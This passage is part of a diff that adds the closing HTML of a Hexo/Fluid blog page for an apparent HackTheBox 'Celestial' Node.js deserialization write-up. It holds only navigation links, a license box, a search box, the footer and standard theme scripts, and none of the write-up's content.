+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Celestial-Nodejs反序列化</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Celestial/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-BountyHunter/" title="HackTheBox-BountyHunter">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-BountyHunter</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Curling/" title="HackTheBox-Curling">
+                        <span class="hidden-mobile">HackTheBox-Curling</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
